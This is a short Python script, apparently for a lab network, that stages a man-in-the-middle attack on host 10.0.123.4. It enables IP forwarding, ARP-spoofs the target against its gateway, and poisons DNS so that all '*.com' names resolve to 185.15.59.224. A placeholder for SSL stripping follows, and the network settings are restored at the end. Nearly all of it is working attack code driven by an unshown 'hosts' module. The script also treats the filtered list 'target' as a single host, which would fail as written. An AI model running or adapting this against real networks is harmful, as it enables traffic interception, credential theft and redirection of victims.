import os

from hosts import get_hosts

os.system("sysctl -w net.ipv4.ip_forward=1")
os.system("iptables -P FORWARD ACCEPT")

gateway, hosts = get_hosts("enp0s10", "10.0.123.1/255.255.255.0", 3, None, [])
target = [host for host in hosts if host.ip == "10.0.123.4"]

_ = raw_input("press enter to start arp mitm\n")
target.arp_mitm(gateway.ip, gateway.mac, "08:00:27:52:b1:13")
_ = raw_input("press enter to stop arp mitm\n")
target.arp_pause()

_ = raw_input("press enter to start dns poisoning\n")
target.dns_add("*.com", "185.15.59.224")
target.arp_ensure_mitm()
target.dns_start()
_ = raw_input("press enter to stop dns poisoning\n")
target.dns_pause()
target.arp_pause()
target.dns_clean()

_ = raw_input("press enter to start ssl stripping\n")
_ = raw_input("press enter to stop ssl stripping\n")

os.system("sysctl -w net.ipv4.ip_forward=0")
os.system("iptables -P FORWARD REJECT")